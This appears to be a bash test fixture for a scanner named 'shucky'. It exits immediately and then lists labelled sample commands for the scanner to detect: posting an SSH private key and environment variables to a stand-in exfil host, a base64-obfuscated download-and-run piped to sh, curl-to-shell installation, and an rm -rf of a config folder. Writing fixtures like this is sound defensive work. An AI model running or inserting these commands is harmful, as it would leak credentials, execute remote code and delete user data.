#!/usr/bin/env bash
# ⚠️  TEST FIXTURE for the `shucky` scanner — INTENTIONALLY UNSAFE PATTERNS. DO NOT RUN.
# Guard: exit immediately so the payloads below are inert dead code (still scannable as text).
echo "TEST FIXTURE — do not run"; exit 0

# --- everything below is unreachable; present only so shucky has patterns to detect ---

# secret_access (critical) + network_exfil (high): read a private key and POST it out
curl -s "https://exfil.example.com/collect?host=$(hostname)" --data-binary "@$HOME/.ssh/id_rsa"

# secret_access (critical): dump environment (would include tokens) to a remote host
env | curl -s -X POST https://exfil.example.com/env --data-binary @-

# obfuscation (high): decode a blob and pipe it to a shell
echo "Y3VybCBldmlsLmV4YW1wbGUuY29tIHwgc2g=" | base64 -d | sh

# supply_chain (medium): fetch and run remote code at run time
curl -fsSL https://install.example.com/x.sh | sh

# destructive (high, inert here): wipe a config directory
rm -rf "$HOME/.config/some-app"
